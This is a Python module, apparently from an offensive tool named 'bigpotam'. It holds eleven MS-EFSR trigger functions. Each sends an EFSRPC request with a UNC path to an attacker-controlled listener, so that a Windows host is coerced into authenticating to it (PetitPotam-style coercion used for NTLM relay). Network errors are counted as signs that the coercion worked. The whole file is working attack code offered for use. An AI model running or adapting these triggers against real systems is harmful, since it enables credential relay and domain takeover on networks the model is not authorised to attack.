"""MS-EFSR trigger functions."""

import logging

from bigpotam.methods import check_error
from bigpotam.paths import efsr_path
from bigpotam.structures import (
    EFS_RPC_BLOB,
    ENCRYPTION_CERTIFICATE_HASH_LIST,
    ENCRYPTION_CERTIFICATE_LIST,
    EfsRpcAddUsersToFile,
    EfsRpcAddUsersToFileEx,
    EfsRpcDecryptFileSrv,
    EfsRpcDuplicateEncryptionInfoFile,
    EfsRpcEncryptFileSrv,
    EfsRpcFileKeyInfo,
    EfsRpcFileKeyInfoEx,
    EfsRpcOpenFileRaw,
    EfsRpcQueryRecoveryAgents,
    EfsRpcQueryUsersOnFile,
    EfsRpcRemoveUsersFromFile,
)

log = logging.getLogger("bigpotam")

_SUCCESS_CODES = {0x00000035, 0x0000007B}  # ERROR_BAD_NETPATH, ERROR_INVALID_NAME
_SUCCESS_STRINGS = ("ERROR_BAD_NETPATH", "ERROR_INVALID_NAME")


def _check_success(e):
    return check_error(e, _SUCCESS_CODES, _SUCCESS_STRINGS)


def trigger_open_file_raw(dce, listener, listener_port=445, **kw):
    try:
        request = EfsRpcOpenFileRaw()
        request["fileName"] = efsr_path(listener, listener_port)
        request["Flag"] = 0
        dce.request(request)
        return True
    except Exception as e:
        if _check_success(e):
            return True
        log.debug("EfsRpcOpenFileRaw: %s", e)
        return False


def trigger_encrypt_file_srv(dce, listener, listener_port=445, **kw):
    try:
        request = EfsRpcEncryptFileSrv()
        request["FileName"] = efsr_path(listener, listener_port)
        dce.request(request)
        return True
    except Exception as e:
        if _check_success(e):
            return True
        log.debug("EfsRpcEncryptFileSrv: %s", e)
        return False


def trigger_decrypt_file_srv(dce, listener, listener_port=445, **kw):
    try:
        request = EfsRpcDecryptFileSrv()
        request["FileName"] = efsr_path(listener, listener_port)
        request["Flag"] = 0
        dce.request(request)
        return True
    except Exception as e:
        if _check_success(e):
            return True
        log.debug("EfsRpcDecryptFileSrv: %s", e)
        return False


def trigger_query_users_on_file(dce, listener, listener_port=445, **kw):
    try:
        request = EfsRpcQueryUsersOnFile()
        request["FileName"] = efsr_path(listener, listener_port)
        dce.request(request)
        return True
    except Exception as e:
        if _check_success(e):
            return True
        log.debug("EfsRpcQueryUsersOnFile: %s", e)
        return False


def trigger_query_recovery_agents(dce, listener, listener_port=445, **kw):
    try:
        request = EfsRpcQueryRecoveryAgents()
        request["FileName"] = efsr_path(listener, listener_port)
        dce.request(request)
        return True
    except Exception as e:
        if _check_success(e):
            return True
        log.debug("EfsRpcQueryRecoveryAgents: %s", e)
        return False


def trigger_remove_users_from_file(dce, listener, listener_port=445, **kw):
    try:
        request = EfsRpcRemoveUsersFromFile()
        request["FileName"] = efsr_path(listener, listener_port)
        request["Users"] = ENCRYPTION_CERTIFICATE_HASH_LIST()
        dce.request(request)
        return True
    except Exception as e:
        if _check_success(e):
            return True
        log.debug("EfsRpcRemoveUsersFromFile: %s", e)
        return False


def trigger_add_users_to_file(dce, listener, listener_port=445, **kw):
    try:
        request = EfsRpcAddUsersToFile()
        request["FileName"] = efsr_path(listener, listener_port)
        request["EncryptionCertificates"] = ENCRYPTION_CERTIFICATE_LIST()
        dce.request(request)
        return True
    except Exception as e:
        if _check_success(e):
            return True
        log.debug("EfsRpcAddUsersToFile: %s", e)
        return False


def trigger_file_key_info(dce, listener, listener_port=445, **kw):
    try:
        request = EfsRpcFileKeyInfo()
        request["FileName"] = efsr_path(listener, listener_port)
        request["infoClass"] = 0
        dce.request(request)
        return True
    except Exception as e:
        if _check_success(e):
            return True
        log.debug("EfsRpcFileKeyInfo: %s", e)
        return False


def trigger_duplicate_encryption_info_file(dce, listener, listener_port=445, **kw):
    try:
        path = efsr_path(listener, listener_port)
        request = EfsRpcDuplicateEncryptionInfoFile()
        request["SrcFileName"] = path
        request["DestFileName"] = path
        request["dwCreationDisposition"] = 0
        request["dwAttributes"] = 0
        request["RelativeSD"] = EFS_RPC_BLOB()
        request["bInheritHandle"] = 0
        dce.request(request)
        return True
    except Exception as e:
        if _check_success(e):
            return True
        log.debug("EfsRpcDuplicateEncryptionInfoFile: %s", e)
        return False


def trigger_add_users_to_file_ex(dce, listener, listener_port=445, **kw):
    try:
        request = EfsRpcAddUsersToFileEx()
        request["dwFlags"] = 0x00000002  # EFSRPC_ADDUSERFLAG_ADD_POLICY_KEYTYPE
        request["FileName"] = efsr_path(listener, listener_port)
        request["EncryptionCertificates"] = ENCRYPTION_CERTIFICATE_LIST()
        dce.request(request)
        return True
    except Exception as e:
        if _check_success(e):
            return True
        log.debug("EfsRpcAddUsersToFileEx: %s", e)
        return False


def trigger_file_key_info_ex(dce, listener, listener_port=445, **kw):
    try:
        request = EfsRpcFileKeyInfoEx()
        request["dwFileKeyInfoFlags"] = 0x00000001  # BASIC_KEY_INFO
        request["Reserved"] = EFS_RPC_BLOB()
        request["FileName"] = efsr_path(listener, listener_port)
        request["InfoClass"] = 0
        dce.request(request)
        return True
    except Exception as e:
        if _check_success(e):
            return True
        log.debug("EfsRpcFileKeyInfoEx: %s", e)
        return False
